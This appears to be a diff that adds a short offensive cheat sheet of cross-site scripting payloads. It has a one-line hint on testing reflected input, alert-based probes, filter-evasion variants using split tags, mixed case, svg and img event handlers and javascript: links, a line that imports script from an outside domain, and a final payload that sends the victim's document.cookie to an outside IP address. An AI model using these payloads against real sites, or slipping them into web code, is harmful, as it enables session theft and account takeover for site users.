@@ -1,0 +1,23 @@
+# Finging..?
+ 
+ 
+  * ">  if reflected is vulnerable ...
+
+# PayLoad ..
+
+ <script>alert(1)</script>
+ <script>alert(document.cookie)</script>
+ <scr<script>ipt>alert(1)</script>
+ <ScRiPt>alert(1)</script>
+ <svg/=onload=alert(1)>
+ <a href=javascript:confirm()>click here>
+ <img src=X onerror="alert('XSS')";>
+ <img src=X onerror="alert(/XSS/)";>
+ <img src=//X55.is onError=import(src)>
+   
+
+<img src=X onerror="alert(document.cookie)";>
+
+
+******
+<script>document.location='http://10.10.16.49:90/?cookie+'+document.cookie</script>
